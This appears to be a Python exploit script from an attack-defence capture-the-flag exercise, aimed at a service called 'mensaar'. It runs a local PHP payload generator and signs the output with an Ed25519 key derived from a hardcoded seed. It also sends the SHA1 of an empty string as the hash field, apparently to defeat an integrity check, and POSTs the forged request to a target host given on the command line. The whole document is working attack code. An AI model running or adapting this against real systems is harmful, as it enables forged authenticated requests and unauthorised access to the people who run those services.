import requests
import nacl.signing
import nacl.encoding
import json
import hashlib
import subprocess
import os
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else 'localhost'

#hardcoded_seed =b'_GF]\xaf\xc3\xc0]$\x9a\xe5\n\xb4\x9c\\P\xdf\xc1k\xdd\xab\xe5\xfe:\xacu^\xf7\x05\xdc\xdd\x03'
hardcoded_seed =b'_GA]\xaf\xc3\xc0]$\x9a\xe5\n\xb4\x9c\\P\xdf\xc1k\xdd\xab\xe5\xfe:\xacu^\xf7\x05\xdc\xdd\x03'
sign_key = nacl.signing.SigningKey(seed=hardcoded_seed)
vk = sign_key.verify_key
res=""
realpath=os.path.realpath(__file__).split("/")[:-1]
workdir="/".join(realpath)
proc = subprocess.Popen("php test_exploit.php", shell=True, stdout=subprocess.PIPE,cwd=workdir)
data = str(proc.stdout.read()[:-1],"utf-8")
#print(data)
sig = sign_key.sign(bytes(data,"utf-8"))
#sig=b"123"
#print(vk.verify(sig))
#h=hashlib.sha1(data.encode("utf-8")).hexdigest()
h=hashlib.sha1("".encode("utf-8")).hexdigest()
#print(h)
params={"data" : data,"token" : sig, "hash" : h}
#print(params)
url=f"http://{TARGET}/mensaar/next_menu.php"
r = requests.post(url,data=params)
print(r.text)
